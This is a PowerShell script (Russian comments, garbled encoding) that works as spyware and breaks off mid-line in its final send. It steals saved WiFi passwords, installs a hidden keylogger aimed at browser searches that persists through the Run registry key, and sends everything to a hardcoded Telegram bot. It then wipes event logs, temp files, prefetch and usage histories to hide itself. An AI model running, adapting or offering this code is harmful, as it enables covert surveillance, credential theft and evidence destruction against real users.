# –û—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# –°–µ—Ç—å –∏ WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# –ö–ï–ô–õ–û–ì–ì–ï–† –î–õ–Ø –ú–û–ù–ò–¢–û–†–ò–ù–ì–ê –ü–û–ò–°–ö–û–í–´–• –ó–ê–ü–†–û–°–û–í
$searchLoggerStatus = "Starting search monitoring..."

# –°–æ–∑–¥–∞–µ–º –∫–µ–π–ª–æ–≥–≥–µ—Ä –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –ø–æ–∏—Å–∫–æ–≤—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
$searchLoggerScript = @"
Add-Type -AssemblyName System.Windows.Forms

`$searchTerms = @()
`$currentBrowser = ""
`$searchBuffer = ""
`$lastSearchTime = [datetime]::Now

function Send-ToTelegram {
    param(`$message)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$message
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
    } catch { }
}

function Process-SearchQuery {
    if(`$searchBuffer -ne "" -and `$searchBuffer.Length -gt 2) {
        `$queryInfo = "üîç SEARCH DETECTED [`$currentBrowser]:`n`$searchBuffer"
        Send-ToTelegram `$queryInfo
        `$searchTerms += "`$([datetime]::Now): `$currentBrowser - `$searchBuffer"
        `$searchBuffer = ""
        `$lastSearchTime = [datetime]::Now
    }
}

function Check-BrowserSearch(`$windowTitle) {
    # –ü–æ–∏—Å–∫–æ–≤—ã–µ —Å–∏—Å—Ç–µ–º—ã –∏ –ø–∞—Ç—Ç–µ—Ä–Ω—ã
    `$searchPatterns = @(
        @{Name="Google"; Pattern=" - Google Search"},
        @{Name="YouTube"; Pattern=" - YouTube"},
        @{Name="Yandex"; Pattern=" - –Ø–Ω–¥–µ–∫—Å"},
        @{Name="Bing"; Pattern=" - Bing"},
        @{Name="DuckDuckGo"; Pattern=" - DuckDuckGo"},
        @{Name="Yahoo"; Pattern=" - Yahoo Search"},
        @{Name="Mail.ru"; Pattern=" - Mail.ru"},
        @{Name="Rambler"; Pattern=" - Rambler"}
    )
    
    # URL –ø–æ–∏—Å–∫–æ–≤—ã—Ö —Å–∏—Å—Ç–µ–º –≤ –∞–¥—Ä–µ—Å–Ω–æ–π —Å—Ç—Ä–æ–∫–µ
    `$searchUrls = @(
        "google.com/search",
        "youtube.com/results",
        "yandex.ru/search",
        "bing.com/search",
        "duckduckgo.com",
        "search.yahoo.com",
        "go.mail.ru/search",
        "nova.rambler.ru/search"
    )
    
    foreach(`$pattern in `$searchPatterns) {
        if(`$windowTitle -like "*`$(`$pattern.Pattern)*") {
            `$query = `$windowTitle -replace "`$(`$pattern.Pattern)", "" -replace "-", "" -replace "`$", "" -replace "^", ""
            return @{Browser=`$pattern.Name; Query=`$query.Trim()}
        }
    }
    
    foreach(`$url in `$searchUrls) {
        if(`$windowTitle -like "*`$url*") {
            return @{Browser="Browser"; Query=`$windowTitle}
        }
    }
    
    return `$null
}

while(`$true) {
    try {
        # –ü–æ–ª—É—á–∞–µ–º –∞–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ
        `$activeWindow = ""
        `$processName = ""
        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending
        if(`$processes) {
            `$activeWindow = `$processes[0].MainWindowTitle
            `$processName = `$processes[0].ProcessName
        }
        
        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –±—Ä–∞—É–∑–µ—Ä
        `$isBrowser = `$false
        `$browserName = ""
        
        if(`$processName -like "*chrome*") { `$browserName = "Chrome"; `$isBrowser = `$true }
        elseif(`$processName -like "*firefox*") { `$browserName = "Firefox"; `$isBrowser = `$true }
        elseif(`$processName -like "*edge*") { `$browserName = "Edge"; `$isBrowser = `$true }
        elseif(`$processName -like "*opera*") { `$browserName = "Opera"; `$isBrowser = `$true }
        elseif(`$processName -like "*safari*") { `$browserName = "Safari"; `$isBrowser = `$true }
        elseif(`$processName -like "*iexplore*") { `$browserName = "Internet Explorer"; `$isBrowser = `$true }
        elseif(`$processName -like "*brave*") { `$browserName = "Brave"; `$isBrowser = `$true }
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø–æ–∏—Å–∫–æ–≤—ã–µ –∑–∞–ø—Ä–æ—Å—ã
        if(`$isBrowser -and `$activeWindow -ne "") {
            `$searchResult = Check-BrowserSearch(`$activeWindow)
            if(`$searchResult -ne `$null) {
                `$currentBrowser = "`$(`$searchResult.Browser) (`$browserName)"
                `$searchBuffer = `$searchResult.Query
                Process-SearchQuery
            }
        }
        
        # –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –≤–≤–æ–¥ –≤ –∞–¥—Ä–µ—Å–Ω—ã—Ö —Å—Ç—Ä–æ–∫–∞—Ö –∏ –ø–æ–∏—Å–∫–æ–≤—ã—Ö –ø–æ–ª—è—Ö
        for(`$i = 8; `$i -lt 255; `$i++) {
            `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
            if(`$keyState -eq -32767) {
                `$key = [System.Windows.Forms.Keys]`$i
                
                # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º Enter (–æ—Ç–ø—Ä–∞–≤–∫–∞ –ø–æ–∏—Å–∫–æ–≤–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞)
                if(`$key -eq "Enter" -and `$searchBuffer -ne "" -and `$isBrowser) {
                    Process-SearchQuery
                }
                
                # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –æ–±—ã—á–Ω—ã–µ —Å–∏–º–≤–æ–ª—ã —Ç–æ–ª—å–∫–æ –≤ –±—Ä–∞—É–∑–µ—Ä–∞—Ö
                if(`$isBrowser) {
                    switch(`$key) {
                        {`$key -ge 65 -and `$key -le 90} {
                            # –ë—É–∫–≤—ã A-Z
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                            `$isCaps = [System.Windows.Forms.Console]::CapsLock
                            
                            if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                                `$searchBuffer += `$key.ToString()
                            } else {
                                `$searchBuffer += `$key.ToString().ToLower()
                            }
                        }
                        {`$key -ge 48 -and `$key -le 57} {
                            # –¶–∏—Ñ—Ä—ã 0-9
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                            `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                            if(`$isShift) {
                                `$searchBuffer += `$symbols[`$key - 48]
                            } else {
                                `$searchBuffer += (`$key - 48).ToString()
                            }
                        }
                        "Space" { `$searchBuffer += " " }
                        "Back" { 
                            if(`$searchBuffer.Length -gt 0) { 
                                `$searchBuffer = `$searchBuffer.Substring(0, `$searchBuffer.Length - 1) 
                            }
                        }
                        "OemPeriod" { `$searchBuffer += "." }
                        "Oemcomma" { `$searchBuffer += "," }
                        "OemQuestion" { `$searchBuffer += "?" }
                        "Oem1" { `$searchBuffer += ";" }
                        "Oem7" { `$searchBuffer += "'" }
                        "OemOpenBrackets" { `$searchBuffer += "[" }
                        "Oem6" { `$searchBuffer += "]" }
                        "Oem5" { `$searchBuffer += "\\" }
                        "OemMinus" { `$searchBuffer += "-" }
                        "Oemplus" { `$searchBuffer += "=" }
                    }
                }
                
                # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É –±—É—Ñ–µ—Ä–∞
                if(`$searchBuffer.Length -gt 200) {
                    `$searchBuffer = `$searchBuffer.Substring(0, 200)
                }
            }
        }
        
        # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –¥–ª–∏–Ω–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã
        if(`$searchBuffer.Length -gt 30 -and ([datetime]::Now - `$lastSearchTime).TotalSeconds -gt 10) {
            Process-SearchQuery
        }
        
    } catch { }
    Start-Sleep -Milliseconds 10
}
"@

# –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø–æ–∏—Å–∫–æ–≤—ã–π –∫–µ–π–ª–æ–≥–≥–µ—Ä
try {
    $searchLoggerScript | Out-File "$env:TEMP\search_logger.ps1" -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`"" -WindowStyle Hidden
    
    # –î–æ–±–∞–≤–ª—è–µ–º –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`""
    Set-ItemProperty -Path $startupPath -Name "SearchMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $searchLoggerStatus = "‚úÖ Search monitoring active - tracking all browser searches"
} catch {
    $searchLoggerStatus = "‚ùå Search logger failed: $($_.Exception.Message)"
}

# –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ –ª–æ–∫–∞–ª—å–Ω–æ–π —Å–µ—Ç–∏", "Local Area Connection" -replace "–ë–µ—Å–ø—Ä–æ–≤–æ–¥–Ω–∞—è —Å–µ—Ç—å", "Wireless Network" -replace "–°–µ—Ç–µ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== SEARCH MONITORING ===
$searchLoggerStatus

Supported browsers:
- Chrome, Firefox, Edge, Opera, Safari, Brave, IE

Supported search engines:
- Google, YouTube, Yandex, Bing, DuckDuckGo, Yahoo, Mail.ru, Rambler

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# === –û–ß–ò–°–¢–ö–ê –°–õ–ï–î–û–í ===
Write-Host "Cleaning traces..."

# [–û–°–¢–ê–õ–¨–ù–ê–Ø –ß–ê–°–¢–¨ –ö–û–î–ê –û–ß–ò–°–¢–ö–ò –û–°–¢–ê–ï–¢–°–Ø –ë–ï–ó –ò–ó–ú–ï–ù–ï–ù–ò–ô...]

# 1. –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ RUN (–¥–∏–∞–ª–æ–≥ –í—ã–ø–æ–ª–Ω–∏—Ç—å)
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì RUN dialog history cleared"
} catch {
    Write-Host "‚úó Failed to clear RUN history"
}

# 2. –û—á–∏—Å—Ç–∫–∞ –Ω–µ–¥–∞–≤–Ω–∏—Ö –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Name "*" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Recent documents cleared"
} catch {
    Write-Host "‚úó Failed to clear recent documents"
}

# 3. –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ PowerShell
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    Clear-History
    Write-Host "‚úì PowerShell history cleared"
} catch {
    Write-Host "‚úó Failed to clear PowerShell history"
}

# 4. –û—á–∏—Å—Ç–∫–∞ –∫—ç—à–∞ DNS
try {
    Clear-DnsClientCache
    Write-Host "‚úì DNS cache cleared"
} catch {
    Write-Host "‚úó Failed to clear DNS cache"
}

# 5. –û—á–∏—Å—Ç–∫–∞ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
try {
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:LOCALAPPDATA\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Temporary files cleared"
} catch {
    Write-Host "‚úó Failed to clear temporary files"
}

# 6. –û—á–∏—Å—Ç–∫–∞ –∂—É—Ä–Ω–∞–ª–æ–≤ —Å–æ–±—ã—Ç–∏–π (–∫–ª—é—á–µ–≤—ã–µ –ª–æ–≥–∏)
try {
    wevtutil el | ForEach-Object {
        if ($_ -match "PowerShell|Windows PowerShell|Microsoft-Windows-PowerShell|System|Security") {
            try {
                wevtutil cl $_ 2>$null
            } catch {}
        }
    }
    Write-Host "‚úì Event logs cleared"
} catch {
    Write-Host "‚úó Failed to clear event logs"
}

# 7. –û—á–∏—Å—Ç–∫–∞ Prefetch (—É—Å–∫–æ—Ä–µ–Ω–∏–µ –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º)
try {
    Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Prefetch files cleared"
} catch {
    Write-Host "‚úó Failed to clear prefetch files"
}

# 8. –û—á–∏—Å—Ç–∫–∞ –∫–æ—Ä–∑–∏–Ω—ã
try {
    Remove-Item "C:\`$Recycle.Bin\*" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Recycle Bin cleared"
} catch {
    Write-Host "‚úó Failed to clear Recycle Bin"
}

# 9. –û—á–∏—Å—Ç–∫–∞ –∫—ç—à–∞ —ç—Å–∫–∏–∑–æ–≤
try {
    Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db" -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Thumbnail cache cleared"
} catch {
    Write-Host "‚úó Failed to clear thumbnail cache"
}

# 10. –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞
try {
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -Name "*" -Force -ErrorAction SilentlyContinue
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Explorer typed paths cleared"
} catch {
    Write-Host "‚úó Failed to clear explorer typed paths"
}

# 11. –û—á–∏—Å—Ç–∫–∞ –∫—ç—à–∞ —à—Ä–∏—Ñ—Ç–æ–≤
try {
    Remove-Item "$env:LOCALAPPDATA\Microsoft\Windows\FontCache\*" -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Font cache cleared"
} catch {
    Write-Host "‚úó Failed to clear font cache"
}

# 12. –û—á–∏—Å—Ç–∫–∞ —Ñ–∞–π–ª–∞ –ø–æ–¥–∫–∞—á–∫–∏ –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–π –∑–∞–≥—Ä—É–∑–∫–µ
try {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "ClearPageFileAtShutdown" -Value 1 -Type DWord -Force
    Write-Host "‚úì Page file will be cleared on next shutdown"
} catch {
    Write-Host "‚úó Failed to set page file clearing"
}

# 13. –û—á–∏—Å—Ç–∫–∞ –∏—Å—Ç–æ—Ä–∏–∏ –ø–æ–∏—Å–∫–∞ Windows
try {
    Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Windows search history cleared"
} catch {
    Write-Host "‚úó Failed to clear Windows search history"
}

# 14. –û—á–∏—Å—Ç–∫–∞ –∫—ç—à–∞ –∑–Ω–∞—á–∫–æ–≤
try {
    Remove-Item "$env:LOCALAPPDATA\IconCache.db" -Force -ErrorAction SilentlyContinue
    Write-Host "‚úì Icon cache cleared"
} catch {
    Write-Host "‚úó Failed to clear icon cache"
}

# 15. –§–∏–Ω–∞–ª–∏–∑–∞—Ü–∏—è - –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ –¥–ª—è –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –∏–∑–º–µ–Ω–µ–Ω–∏–π
try {
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Start-Process "explorer.exe"
    Write-Host "‚úì Explorer restarted"
} catch {
    Write-Host "‚úó Failed to restart explorer"
}

Write-Host "All cleanup operations completed!"
Write-Host "System traces have been successfully removed."

# –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—á–∏—Å—Ç–∫–∏
$cleanupMsg = "‚úÖ System cleanup completed at $(Get-Date)`n`nCleaned items:`n- RUN dialog history`n- Recent documents`n- PowerShell history`n- DNS cache`n- Temporary files`n- Event logs`n- Prefetch files`n- Recycle Bin`n- Thumbnail cache`n- Explorer history`n- Search history`n- Various caches`n`nüîç Search monitoring is ACTIVE - tracking all browser searches"

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id
